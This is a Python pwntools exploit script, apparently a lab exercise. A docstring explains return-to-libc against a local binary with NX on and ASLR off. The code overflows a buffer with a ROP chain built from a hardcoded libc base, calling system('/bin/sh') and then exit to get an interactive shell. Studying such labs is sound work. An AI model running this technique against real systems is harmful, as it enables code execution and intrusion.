#!/usr/bin/env python3

"""

Stack:      No canary found
NX:         NX enabled
PIE:        No PIE (0x400000)
ASLR:       Disabled

The introduction of the NX (No-Execute) bit makes certain memory sections, like .data, .bss, the stack, and the heap, non-executable.
This means we can no longer directly execute shellcode placed on the stack. To bypass this restriction, we use a technique called 
"return-to-libc." Instead of executing custom shellcode, this method chains calls to existing functions within the libc library, such
as system, by using their absolute addresses. These addresses are determined by combining the libc base address (found using tools like ldd)
with the known offsets of functions or gadgets within libc.
"""

from pwn import *

bin = context.binary = ELF("./vuln.o")
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
libc_rop = ROP("/lib/x86_64-linux-gnu/libc.so.6")


def start(argv=[], *a, **kw):
    """Start the exploit against the target."""
    if args.GDB:
        context.terminal = ["gnome-terminal", "--"]
        return gdb.debug([bin.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([bin.path] + argv, *a, **kw)


gdbscript = """
init-pwndbg
b main
continue
""".format(
    **locals()
)

io = start()

libc_base = 0x00007FFFF7DC9000

payload = b""

junk = cyclic(264)

pop_rdi = libc_base + libc_rop.find_gadget(["pop rdi", "ret"])[0]

ret = libc_base + libc_rop.find_gadget(["ret"])[0]

shell = libc_base + next(libc.search(b"/bin/sh"))

system = libc_base + libc.sym.system

ext = libc_base + libc.sym.exit

payload = (
    junk
    + pack(pop_rdi)
    + pack(shell)
    + pack(ret)
    + pack(system)
    + pack(pop_rdi)
    + pack(0x0)
    + pack(ext)
)

io.recvuntil(b": ")

io.sendline(payload)

io.interactive()
